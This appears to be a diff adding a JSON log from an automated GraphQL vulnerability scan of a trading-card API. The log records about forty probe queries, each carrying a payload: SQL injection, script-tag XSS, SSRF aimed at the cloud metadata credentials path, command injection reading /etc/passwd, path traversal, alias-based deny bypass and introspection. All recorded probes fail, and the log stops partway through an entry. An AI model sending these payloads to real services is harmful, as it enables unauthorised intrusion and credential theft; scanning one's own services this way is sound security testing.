@@ -1,0 +1,1462 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy-123' OR '1'='1'; --\", set: \"Base\") {\n    id\n    name\n    description\n    set { id name }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.815,
+    "timestamp": "2025-10-02T18:26:42.953920Z",
+    "count": 1,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xss-1\", set: \"<script>alert('xss')</script>\") {\n    id\n    name\n    description\n    image\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.07,
+    "timestamp": "2025-10-02T18:26:45.985929Z",
+    "count": 2,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"ssrf-test\", set: \"http://169.254.169.254/latest/meta-data\") {\n    id\n    name\n    image\n    set {\n      id\n      name\n      logo\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.973,
+    "timestamp": "2025-10-02T18:26:49.945415Z",
+    "count": 3,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"oscmd-; uname -a; echo\", set: \"Base\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.118,
+    "timestamp": "2025-10-02T18:26:53.830774Z",
+    "count": 4,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"../../etc/passwd\", set: \"Base\") {\n    id\n    name\n    image\n    set { id name logo }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.923,
+    "timestamp": "2025-10-02T18:26:57.573715Z",
+    "count": 5,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"html-1\", set: \"<div onclick='alert(1)'>click</div>\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.23,
+    "timestamp": "2025-10-02T18:27:00.832771Z",
+    "count": 6,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"restricted-999\", set: \"SecretSet\") {\n    id\n    name\n    rarity\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.069,
+        "timestamp": "2025-10-02T18:27:03.601330Z",
+        "response_body": {
+          "data": {
+            "card": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.953,
+        "timestamp": "2025-10-02T18:27:04.554115Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 7,
+    "timestamp": "2025-10-02T18:27:04.554186Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.884,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: card(id: \"restricted-999\", set: \"SecretSet\") {\n    id\n    name\n    rarity\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.915,
+        "timestamp": "2025-10-02T18:27:10.220775Z",
+        "response_body": {
+          "data": {
+            "card": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.878,
+        "timestamp": "2025-10-02T18:27:11.098593Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-02T18:27:11.098692Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.864,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card {\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n  card(id: \"base-1\", set: \"Base\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.86,
+    "timestamp": "2025-10-02T18:27:15.346503Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Fields \"card\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            },
+            {
+              "line": 12,
+              "column": 3
+            }
+          ]
+        },
+        {
+          "message": "Field \"types\" must not have a selection since type \"[String]\" has no subfields.",
+          "locations": [
+            {
+              "line": 4,
+              "column": 11
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy-1\", set: \"Base\") {\n    id\n    nam\n    namee\n    description\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.878,
+    "timestamp": "2025-10-02T18:27:18.920027Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Card\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"namee\" on type \"Card\". Did you mean \"name\" or \"image\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy-1\", set: \"Base\") {\n    id\n    name\n    hp\n    rarity\n    types\n    image\n    set {\n      id\n      name\n      releaseDate\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.405,
+    "timestamp": "2025-10-02T18:27:22.732061Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"base1-1\", set: \"base-set\" }) {\n    id\n    name\n    rarity\n    hp\n    image\n    types\n    set {\n      id\n      name\n      releaseDate\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.826,
+    "timestamp": "2025-10-02T18:30:45.265197Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"1' OR '1'='1\", set: \"base-set\" }) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.772,
+    "timestamp": "2025-10-02T18:30:50.808088Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"<script>alert('xss')</script>\", set: \"base-set\" }) {\n    id\n    name\n    description\n    image\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.201,
+    "timestamp": "2025-10-02T18:30:55.587562Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", set: \"http://127.0.0.1:8000/internal\" }) {\n    id\n    name\n    image\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 10.009,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='api.tcgdex.net', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-02T18:31:07.513475Z",
+    "count": 15
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"1; cat /etc/passwd\", set: \"base-set\" }) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 3.793,
+    "timestamp": "2025-10-02T18:31:11.306591Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"../../../etc/passwd\", set: \"/var/www/html/../../../../etc/passwd\" }) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.835,
+    "timestamp": "2025-10-02T18:31:14.741906Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"<div><strong>Injected HTML</strong></div>\", set: \"base-set\" }) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 6.697,
+    "timestamp": "2025-10-02T18:31:23.676202Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"secret-001\", set: \"restricted-set\" }) {\n    id\n    name\n    set {\n      id\n      name\n      cards {\n        id\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.677,
+        "timestamp": "2025-10-02T18:31:27.050316Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"card\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 8
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.496,
+        "timestamp": "2025-10-02T18:31:28.546077Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"card\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 11
+                }
+              ]
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-02T18:31:28.546183Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 1.338,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: card(card: { id: \"secret-001\", set: \"restricted-set\" }) {\n    id\n    name\n    set {\n      id\n      name\n      cards {\n        id\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.84,
+        "timestamp": "2025-10-02T18:31:32.641693Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"card\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 8
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.976,
+        "timestamp": "2025-10-02T18:31:33.617636Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"card\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 11
+                }
+              ]
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-10-02T18:31:33.617785Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 1.156,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.213,
+    "timestamp": "2025-10-02T18:31:38.345921Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"types\" must not have a selection since type \"[String]\" has no subfields.",
+          "locations": [
+            {
+              "line": 4,
+              "column": 11
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(card: { id: \"base1-1\", set: \"base-set\" }) {\n    nam\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.153,
+    "timestamp": "2025-10-02T18:31:42.142875Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"card\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"nam\" on type \"Card\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"' OR '1'='1\", set: \"Base Set\"}) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.063,
+    "timestamp": "2025-10-02T18:34:33.290584Z",
+    "count": 23,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"pikachu<script>alert('xss')</script>\", set: \"Base Set\"}) {\n    id\n    name\n    description\n    image\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.829,
+    "timestamp": "2025-10-02T18:34:36.620520Z",
+    "count": 24,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", set: \"Base Set\"}) {\n    id\n    name\n    image\n    description\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.523,
+    "timestamp": "2025-10-02T18:34:39.806192Z",
+    "count": 25,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"; cat /etc/passwd ;\", set: \"Base Set\"}) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.295,
+    "timestamp": "2025-10-02T18:34:42.817646Z",
+    "count": 26,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"../../../../etc/passwd\", set: \"Base Set\"}) {\n    id\n    name\n    image\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.885,
+    "timestamp": "2025-10-02T18:34:45.796630Z",
+    "count": 27,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"<img src=x onerror=alert(1)>\", set: \"Base Set\"}) {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.897,
+    "timestamp": "2025-10-02T18:34:48.863802Z",
+    "count": 28,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"restricted-12345\", set: \"secret-release\"}) {\n    id\n    name\n    level\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.839,
+        "timestamp": "2025-10-02T18:34:51.566074Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"input\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 8
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.996,
+        "timestamp": "2025-10-02T18:34:52.562361Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"input\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 11
+                }
+              ]
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 29,
+    "timestamp": "2025-10-02T18:34:52.562433Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.861,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: card(input: {id: \"restricted-12345\", set: \"secret-release\"}) {\n    sid: id\n    name\n    level\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.761,
+        "timestamp": "2025-10-02T18:34:57.591646Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"input\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 8
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.484,
+        "timestamp": "2025-10-02T18:34:59.075718Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Unknown argument \"input\" on field \"Query.card\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 11
+                }
+              ]
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-10-02T18:34:59.075860Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 1.333,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n  card(input: {id: \"pikachu\", set: \"Base Set\"}) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.09,
+    "timestamp": "2025-10-02T18:35:03.226309Z",
+    "count": 31,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Fields \"card\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            },
+            {
+              "line": 11,
+              "column": 3
+            }
+          ]
+        },
+        {
+          "message": "Field \"types\" must not have a selection since type \"[String]\" has no subfields.",
+          "locations": [
+            {
+              "line": 4,
+              "column": 11
+            }
+          ]
+        },
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 11,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"xy-001\", set: \"Base Set\"}) {\n    nam\n    descripton\n    imag\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.86,
+    "timestamp": "2025-10-02T18:35:06.650263Z",
+    "count": 32,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"nam\" on type \"Card\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"descripton\" on type \"Card\". Did you mean \"description\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"imag\" on type \"Card\". Did you mean \"image\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(input: {id: \"xy-001\", set: \"Base Set\"}) {\n    id\n    name\n    rarity\n    hp\n    types\n    set {\n      id\n      name\n      releaseDate\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.97,
+    "timestamp": "2025-10-02T18:35:10.574827Z",
+    "count": 33,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"input\" on field \"Query.card\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 8
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy7-45\", set: \"base1\") {\n    id\n    name\n    hp\n    types\n    image\n    set {\n      id\n      name\n      releaseDate\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.048,
+    "timestamp": "2025-10-02T18:38:40.567897Z",
+    "count": 34,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"1' OR '1'='1\", set: \"base1\") {\n    id\n    name\n    description\n    set { id name }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.413,
+    "timestamp": "2025-10-02T18:38:44.326317Z",
+    "count": 35,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy7-45\", set: \"<script>alert('xss')</script>\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.515,
+    "timestamp": "2025-10-02T18:38:47.656585Z",
+    "count": 36,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", set: \"base1\") {\n    id\n    name\n    image\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.884,
+    "timestamp": "2025-10-02T18:38:51.539532Z",
+    "count": 37,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"1; cat /etc/passwd\", set: \"base1\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.3,
+    "timestamp": "2025-10-02T18:38:55.144580Z",
+    "count": 38,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"../../../../../etc/passwd\", set: \"base1\") {\n    id\n    name\n    image\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.357,
+    "timestamp": "2025-10-02T18:38:58.074409Z",
+    "count": 39,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"xy7-45\", set: \"<div onclick=\\\"alert('xss')\\\">Click me</div>\") {\n    id\n    name\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.495,
+    "timestamp": "2025-10-02T18:39:01.378576Z",
+    "count": 40,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "card": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  card(id: \"restricted-999\", set: \"secret-set\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
